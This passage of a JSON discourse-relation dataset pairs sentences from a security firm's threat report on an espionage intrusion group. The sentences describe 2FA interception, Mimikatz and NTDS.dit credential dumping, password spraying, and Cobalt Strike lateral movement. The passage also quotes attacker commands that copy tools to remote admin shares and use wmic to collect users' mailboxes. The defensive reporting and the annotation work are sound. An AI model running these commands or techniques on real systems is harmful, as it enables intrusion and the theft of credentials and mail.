        "S1": "It was possible to configure an alternate phone number for the logged in user account at the company portal.",
        "S2": "The adversary used this opportunity to configure an alternate phone number controlled by the adversary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The adversary used this opportunity to configure an alternate phone number controlled by the adversary.",
        "S2": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "relation": "NEXT"
    },
    {
        "S1": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "S2": "However, they also made a mistake during this process within one incident.",
        "relation": "NEXT"
    },
    {
        "S1": "However, they also made a mistake during this process within one incident.",
        "S2": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "S2": "However the European owner of the account received a text message with Simplified Chinese characters on the primary phone number in the middle of the night Eastern European Time (EET).",
        "relation": "ELABORATION"
    },
    {
        "S1": "However the European owner of the account received a text message with Simplified Chinese characters on the primary phone number in the middle of the night Eastern European Time (EET).",
        "S2": "NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browser\u2019s language settings used during the authentication flow.",
        "relation": "ELABORATION"
    },
    {
        "S1": "NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browser\u2019s language settings used during the authentication flow.",
        "S2": "Thus the 2FA code was sent with supporting Chinese text.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Thus the 2FA code was sent with supporting Chinese text.",
        "S2": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "relation": "MISC"
    },
    {
        "S1": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "S2": "But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands:",
        "relation": "ELABORATION"
    },
    {
        "S1": "But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands:",
        "S2": "If the user account doesn\u2019t have local administrative or domain administrative permissions, the adversary attempts to discover which local or domain admin accounts exist, and exfiltrates the admin\u2019s usernames.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the user account doesn\u2019t have local administrative or domain administrative permissions, the adversary attempts to discover which local or domain admin accounts exist, and exfiltrates the admin\u2019s usernames.",
        "S2": "To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.",
        "relation": "NEXT"
    },
    {
        "S1": "To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.",
        "S2": "The built-in Windows quser-command to show logged on users is also heavily used by them.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The built-in Windows quser-command to show logged on users is also heavily used by them.",
        "S2": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "S2": "The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.",
        "relation": "NEXT"
    },
    {
        "S1": "The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.",
        "S2": "In other cases, the adversary moved laterally to another system with a domain admin logged in.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In other cases, the adversary moved laterally to another system with a domain admin logged in.",
        "S2": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "S2": "The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command:",
        "relation": "NEXT"
    },
    {
        "S1": "The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command:",
        "S2": "Note: the adversary renamed ntdsaudit.exe to msadcs.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Note: the adversary renamed ntdsaudit.exe to msadcs.exe.",
        "S2": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "relation": "NEXT"
    },
    {
        "S1": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "S2": "Both ntdsutil and esentutl are by default installed on a domain controller.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Both ntdsutil and esentutl are by default installed on a domain controller.",
        "S2": "A tool used by the adversary which wasn\u2019t installed on the servers by default, was DSInternals.",
        "relation": "MISC"
    },
    {
        "S1": "A tool used by the adversary which wasn\u2019t installed on the servers by default, was DSInternals.",
        "S2": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "relation": "ELABORATION"
    },
    {
        "S1": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "S2": "The files and directories found on various systems of a victim match with DSInternals version 2.16.1.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The files and directories found on various systems of a victim match with DSInternals version 2.16.1.",
        "S2": "We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.",
        "S2": "We haven\u2019t recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We haven\u2019t recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both.",
        "S2": "The adversary installs a hackers best friend during the intrusion: Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary installs a hackers best friend during the intrusion: Cobalt Strike.",
        "S2": "Cobalt Strike is a framework designed for adversary simulation intended for penetration testers and red teams.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cobalt Strike is a framework designed for adversary simulation intended for penetration testers and red teams.",
        "S2": "It has been widely adopted by malicious threats as well.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It has been widely adopted by malicious threats as well.",
        "S2": "The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner.",
        "relation": "MISC"
    },
    {
        "S1": "The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner.",
        "S2": "At least the following three versions of Cobalt Strike have been in use by the adversary:",
        "relation": "ELABORATION"
    },
    {
        "S1": "At least the following three versions of Cobalt Strike have been in use by the adversary:",
        "S2": "Fox-IT has been collecting information about Cobalt Strike team servers since January 2015.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Fox-IT has been collecting information about Cobalt Strike team servers since January 2015.",
        "S2": "This research project covers the fingerprinting of Cobalt Strike servers and is described in Fox-IT blog \u201cIdentifying Cobalt Strike team servers in the wild\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This research project covers the fingerprinting of Cobalt Strike servers and is described in Fox-IT blog \u201cIdentifying Cobalt Strike team servers in the wild\u201d.",
        "S2": "The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.",
        "S2": "Because of this, historic information was available during this investigation.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Because of this, historic information was available during this investigation.",
        "S2": "Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.",
        "relation": "MISC"
    },
    {
        "S1": "Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.",
        "S2": "If a match was found, the configuration of the Cobalt Strike team server was analysed.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If a match was found, the configuration of the Cobalt Strike team server was analysed.",
        "S2": "This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings.",
        "relation": "NEXT"
    },
    {
        "S1": "This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings.",
        "S2": "The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.",
        "S2": "An example of the creation of such a scheduled task by the adversary:",
        "relation": "ELABORATION"
    },
    {
        "S1": "An example of the creation of such a scheduled task by the adversary:",
        "S2": "The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.",
        "relation": "MISC"
    },
    {
        "S1": "The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.",
        "S2": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "S2": "Once the system is rebooted, the beacon is gone.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the system is rebooted, the beacon is gone.",
        "S2": "The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.",
        "S2": "Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.",
        "S2": "We haven\u2019t seen the adversary use those access methods after the first Cobalt Strike beacons were installed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We haven\u2019t seen the adversary use those access methods after the first Cobalt Strike beacons were installed.",
        "S2": "Maybe because it was never necessary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Maybe because it was never necessary.",
        "S2": "After the first bulk of data is exfiltrated, the persistent access into the victim\u2019s network is periodically used by the adversary to check if new data of interest is available.",
        "relation": "MISC"
    },
    {
        "S1": "After the first bulk of data is exfiltrated, the persistent access into the victim\u2019s network is periodically used by the adversary to check if new data of interest is available.",
        "S2": "They also create a copy of the NTDS.dit and SYSTEM-registry hive file for new credentials to crack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They also create a copy of the NTDS.dit and SYSTEM-registry hive file for new credentials to crack.",
        "S2": "The adversary applied a wide range of discovery tactics.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary applied a wide range of discovery tactics.",
        "S2": "In the list below we have highlighted a few specific tools the adversary used for discovery purposes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the list below we have highlighted a few specific tools the adversary used for discovery purposes.",
        "S2": "You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article.",
        "relation": "ELABORATION"
    },
    {
        "S1": "You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article.",
        "S2": "This command exports a text file with comma separated fields.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This command exports a text file with comma separated fields.",
        "S2": "The text files contain the contents of the Security Event log after the specified date.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The text files contain the contents of the Security Event log after the specified date.",
        "S2": "Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft).",
        "relation": "MISC"
    },
    {
        "S1": "Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft).",
        "S2": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "S2": "A possible intent of the adversary could be to identify if privileged users are active on the systems.",
        "relation": "NEXT"
    },
    {
        "S1": "A possible intent of the adversary could be to identify if privileged users are active on the systems.",
        "S2": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "S2": "It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found password hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv.",
        "relation": "NEXT"
    },
    {
        "S1": "It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found password hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv.",
        "S2": "The NtdsAudit utility is an auditing tool for Active Directory databases.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The NtdsAudit utility is an auditing tool for Active Directory databases.",
        "S2": "It allows the user to collect useful statistics related to accounts and passwords.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It allows the user to collect useful statistics related to accounts and passwords.",
        "S2": "The utility was found on various systems of a victim and matches the NtdsAudit.exe program file version v2.0.5 published on the GitHub project page.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The utility was found on various systems of a victim and matches the NtdsAudit.exe program file version v2.0.5 published on the GitHub project page.",
        "S2": "Network service scanning",
        "relation": "MISC"
    },
    {
        "S1": "Network service scanning",
        "S2": "Command used:",
        "relation": "ELABORATION"
    },
    {
        "S1": "Command used:",
        "S2": "Get.exe appears to be a custom tool used to scan IP-ranges for HTTP service information.",
        "relation": "MISC"
    },
    {
        "S1": "Get.exe appears to be a custom tool used to scan IP-ranges for HTTP service information.",
        "S2": "NCC Group and Fox-IT decompiled the tool for analysis.",
        "relation": "ELABORATION"
    },
    {
        "S1": "NCC Group and Fox-IT decompiled the tool for analysis.",
        "S2": "This showed the tool was written in the Python scripting language and packed into a Windows executable file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This showed the tool was written in the Python scripting language and packed into a Windows executable file.",
        "S2": "Though Fox-IT didn\u2019t find any direct occurrences of the tool on the internet, the decompiled code showed strong similarities with the source code of a tool named GetHttpsInfo.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Though Fox-IT didn\u2019t find any direct occurrences of the tool on the internet, the decompiled code showed strong similarities with the source code of a tool named GetHttpsInfo.",
        "S2": "GetHttpsInfo scans the internal network for HTTP HTTPS services.",
        "relation": "MISC"
    },
    {
        "S1": "GetHttpsInfo scans the internal network for HTTP HTTPS services.",
        "S2": "The reconnaissance tool getHttpsInfo is able to discover HTTP servers within the range of a network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The reconnaissance tool getHttpsInfo is able to discover HTTP servers within the range of a network.",
        "S2": "The tool was shared on a Chinese forum around 2016.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The tool was shared on a Chinese forum around 2016.",
        "S2": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "S2": "Cobalt Strike has various methods for deploying its beacons at newly compromised systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Cobalt Strike has various methods for deploying its beacons at newly compromised systems.",
        "S2": "We have seen the adversary using SMB, named pipes, PsExec, and WinRM.",
        "relation": "MISC"
    },
    {
        "S1": "We have seen the adversary using SMB, named pipes, PsExec, and WinRM.",
        "S2": "The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim\u2019s network.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim\u2019s network.",
        "S2": "They continue lateral movement and discovery in an attempt to identify the data of interest.",
        "relation": "NEXT"
    },
    {
        "S1": "They continue lateral movement and discovery in an attempt to identify the data of interest.",
        "S2": "This could be a webserver to carve data from memory, or a fileserver to copy IP, as we have both observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This could be a webserver to carve data from memory, or a fileserver to copy IP, as we have both observed.",
        "S2": "At one customer, the data of interest was stored in a separate security zone.",
        "relation": "ELABORATION"
    },
    {
        "S1": "At one customer, the data of interest was stored in a separate security zone.",
        "S2": "The adversary was able to find a dual homed system and compromise it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The adversary was able to find a dual homed system and compromise it.",
        "S2": "From there on they used it as a jump host into the higher security zone and started collecting the intellectual property stored on a file server in that zone.",
        "relation": "NEXT"
    },
    {
        "S1": "From there on they used it as a jump host into the higher security zone and started collecting the intellectual property stored on a file server in that zone.",
        "S2": "In one event we saw the adversary compromise a Linux-system through SSH.",
        "relation": "MISC"
    },
    {
        "S1": "In one event we saw the adversary compromise a Linux-system through SSH.",
        "S2": "The user account was possibly compromised on the Linux server by using credential stuffing or password spraying: Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The user account was possibly compromised on the Linux server by using credential stuffing or password spraying: Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.",
        "S2": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "S2": "But not all tools used by the adversary are so called lolbins: As said before, they use Cobalt Strike.",
        "relation": "ELABORATION"
    },
    {
        "S1": "But not all tools used by the adversary are so called lolbins: As said before, they use Cobalt Strike.",
        "S2": "But they also rely on a custom tool for network scanning (get.exe), carving data from memory, compression of data, and exfiltrating data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "But they also rely on a custom tool for network scanning (get.exe), carving data from memory, compression of data, and exfiltrating data.",
        "S2": "But first: How did they get the tools on the victim\u2019s systems?",
        "relation": "ELABORATION"
    },
    {
        "S1": "But first: How did they get the tools on the victim\u2019s systems?",
        "S2": "The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.",
        "S2": "A few examples of commands we observed:",
        "relation": "ELABORATION"
    },
    {
        "S1": "A few examples of commands we observed:",
        "S2": "copy get.exe\\\\<ip>\\c$\\windows\\temp copy msadc\\\\<hostname>\\c$\\Progra~1\\Common~1\\System\\msadc\\ copy update.ex\\\\<ip>\\c$\\windows\\temp\\ move ak002.bat\\\\<ip>\\c$\\windows\\tempup\\date.bat",
        "relation": "ELABORATION"
    },
    {
        "S1": "copy get.exe\\\\<ip>\\c$\\windows\\temp copy msadc\\\\<hostname>\\c$\\Progra~1\\Common~1\\System\\msadc\\ copy update.ex\\\\<ip>\\c$\\windows\\temp\\ move ak002.bat\\\\<ip>\\c$\\windows\\tempup\\date.bat",
        "S2": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "relation": "MISC"
    },
    {
        "S1": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "S2": "As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case.",
        "S2": "This document was exfiltrated and used to continue the intrusion via a company portal and VPN.",
        "relation": "NEXT"
    },
    {
        "S1": "This document was exfiltrated and used to continue the intrusion via a company portal and VPN.",
        "S2": "In all cases we\u2019ve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In all cases we\u2019ve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.",
        "S2": "But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems:",
        "relation": "ELABORATION"
    },
    {
        "S1": "But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems:",
        "S2": "wmic /node:<ip> process call create \"cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\<path>\\<username>\\My Documents\\<filename>.pst\" copy\\\\<hostname>\\c$\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook*.ost",
        "relation": "ELABORATION"
    },
    {
        "S1": "wmic /node:<ip> process call create \"cmd /c copy c:\\Users\\<username>\\<path>\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\<path>\\<username>\\My Documents\\<filename>.pst\" copy\\\\<hostname>\\c$\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook*.ost",
        "S2": "Files and folders of interest are collected as well and staged for exfiltration.",
        "relation": "MISC"
    },
    {
        "S1": "Files and folders of interest are collected as well and staged for exfiltration.",
        "S2": "The goal of targeting some victims appears to be to obtain data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The goal of targeting some victims appears to be to obtain data.",
        "S2": "How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed.",
        "S2": "The DLL\u2019s used were side-loaded in memory on compromised systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The DLL\u2019s used were side-loaded in memory on compromised systems.",
        "S2": "After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.",
        "relation": "NEXT"
    },
    {
        "S1": "After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.",
        "S2": "Adversaries aiming to exfiltrate large amounts of data will often use one or more systems or storage locations for intermittent storage of the collected data.",
        "relation": "NEXT"
    },
    {
        "S1": "Adversaries aiming to exfiltrate large amounts of data will often use one or more systems or storage locations for intermittent storage of the collected data.",
        "S2": "This process is called staging and is one of the of the activities that NCC Group and Fox-IT has observed in the analysed C2 traffic.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This process is called staging and is one of the of the activities that NCC Group and Fox-IT has observed in the analysed C2 traffic.",
        "S2": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "S2": "Most of the times the data is compressed and copied at the same time.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most of the times the data is compressed and copied at the same time.",
        "S2": "Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.",
        "S2": "The adversary compresses and encrypts the data by using WinRAR from the command-line.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The adversary compresses and encrypts the data by using WinRAR from the command-line.",
        "S2": "The filename of the command-line executable for WinRAR is RAR.exe by default.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The filename of the command-line executable for WinRAR is RAR.exe by default.",
        "S2": "This activity group always uses a renamed version of rar.exe.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This activity group always uses a renamed version of rar.exe.",
        "S2": "We have observed the following filenames overlapping all intrusions:",
        "relation": "MISC"
    },
    {
        "S1": "We have observed the following filenames overlapping all intrusions:",
        "S2": "- jucheck.exe",
        "relation": "ELABORATION"
    },
    {
        "S1": "- jucheck.exe",
        "S2": "- RecordedTV.ms",
        "relation": "LIST"
    },
    {
        "S1": "- RecordedTV.ms",
        "S2": "- teredo.tmp",
        "relation": "LIST"
    },
    {
        "S1": "- teredo.tmp",
        "S2": "- update.exe",
        "relation": "LIST"
    },
    {
        "S1": "- update.exe",
        "S2": "- msadcs1.exe",
        "relation": "LIST"
    },
    {
        "S1": "- msadcs1.exe",
        "S2": "The adversary typically places the executables in the following folders:",
        "relation": "MISC"
    },
    {
        "S1": "The adversary typically places the executables in the following folders:",
        "S2": "- C:\\Users\\Public\\Libraries\\",
        "relation": "LIST"
    },
    {
        "S1": "- C:\\Users\\Public\\Libraries\\",
        "S2": "- C:\\Users\\Public\\Videos\\",
        "relation": "LIST"
    },
    {
        "S1": "- C:\\Users\\Public\\Videos\\",
        "S2": "- C:\\Windows\\Temp\\",
        "relation": "LIST"
    },
    {
        "S1": "- C:\\Windows\\Temp\\",
        "S2": "The following four different variants of the use of rar.exe as update.exe we have observed:",
        "relation": "MISC"
    },
    {
        "S1": "The following four different variants of the use of rar.exe as update.exe we have observed:",
        "S2": "The command lines parameters have the following effect:",
        "relation": "MISC"
    },
    {
        "S1": "The command lines parameters have the following effect:",
        "S2": "- a = add to archive.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- a = add to archive.",
        "S2": "- m5 = use compression level 5.",
        "relation": "LIST"
    },
    {
        "S1": "- m5 = use compression level 5.",
        "S2": "- r = recurse subfolders.",
        "relation": "LIST"
    },
    {
        "S1": "- r = recurse subfolders.",
        "S2": "- inul = suppress error messages.",
        "relation": "LIST"
    },
    {
        "S1": "- inul = suppress error messages.",
        "S2": "- hp<password> = encrypt both file data and headers with password.",
        "relation": "LIST"
    },
    {
        "S1": "- hp<password> = encrypt both file data and headers with password.",
        "S2": "The used password, file extensions for the staged data differ per intrusion.",
        "relation": "MISC"
    },
    {
        "S1": "The used password, file extensions for the staged data differ per intrusion.",
        "S2": "We\u2019ve seen the use of .css, .rar, .log.txt, and no extension for staged pieces of data.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We\u2019ve seen the use of .css, .rar, .log.txt, and no extension for staged pieces of data.",
        "S2": "After compromising a host with a Linux operating systems, data is also compressed.",
        "relation": "NEXT"
    },
    {
        "S1": "After compromising a host with a Linux operating systems, data is also compressed.",
        "S2": "This time the adversary compresses the data as a gzipped tar-file: tar.gz.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This time the adversary compresses the data as a gzipped tar-file: tar.gz.",
        "S2": "Sometimes no file extension is used, or the file extension is .il.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Sometimes no file extension is used, or the file extension is .il.",
        "S2": "Most of the times the files names are prepended with adsDL_ or contain the word \u201clist\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Most of the times the files names are prepended with adsDL_ or contain the word \u201clist\u201d.",
        "S2": "The files are staged in the home folder of the compromised user account: /home/<username>/",
        "relation": "ELABORATION"
    },
    {
        "S1": "The files are staged in the home folder of the compromised user account: /home/<username>/",
        "S2": "The adversary uses Cobalt Strike as framework to manage their compromised systems.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary uses Cobalt Strike as framework to manage their compromised systems.",
        "S2": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "S2": "They switched to C2 encapsulated in HTTPS in Q3 2019.",
        "relation": "NEXT"
    },
    {
        "S1": "They switched to C2 encapsulated in HTTPS in Q3 2019.",
        "S2": "An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike.",
        "S2": "This is important to note because the functionalities of Cobalt Strike\u2019s trial version are limited.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is important to note because the functionalities of Cobalt Strike\u2019s trial version are limited.",
        "S2": "More importantly: the trial version doesn\u2019t support encryption of command and control traffic in cases where the protocol itself isn\u2019t encrypted, such as DNS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "More importantly: the trial version doesn\u2019t support encryption of command and control traffic in cases where the protocol itself isn\u2019t encrypted, such as DNS.",
        "S2": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "relation": "MISC"
    },
    {
        "S1": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "S2": "The DNS-responses weren\u2019t logged.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The DNS-responses weren\u2019t logged.",
        "S2": "This means that only the DNS C2 leaving the victim\u2019s network was logged.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This means that only the DNS C2 leaving the victim\u2019s network was logged.",
        "S2": "We developed a Python script that decoded and combined most of the logged C2 communication into a human readable format.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We developed a Python script that decoded and combined most of the logged C2 communication into a human readable format.",
        "S2": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "S2": "With all this activity data, it was possible for us to create some insight into the \u2018office\u2019-hours of this adversary.",
        "relation": "ELABORATION"
    },
    {
        "S1": "With all this activity data, it was possible for us to create some insight into the \u2018office\u2019-hours of this adversary.",
        "S2": "The activity took place six days a week, rarely on Sundays.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The activity took place six days a week, rarely on Sundays.",
        "S2": "The activity started on average at 02:36 UTC and ended rarely after 13:00 UTC.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The activity started on average at 02:36 UTC and ended rarely after 13:00 UTC.",
        "S2": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "S2": "These periods match with the Chinese Golden Week holiday.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These periods match with the Chinese Golden Week holiday.",
        "S2": "The adversary also changed their domains for command control around the same time they switched C2 protocols.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary also changed their domains for command control around the same time they switched C2 protocols.",
        "S2": "They used a subdomain under a regular parent domain with a .com TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.",
        "relation": "ELABORATION"
    },
    {
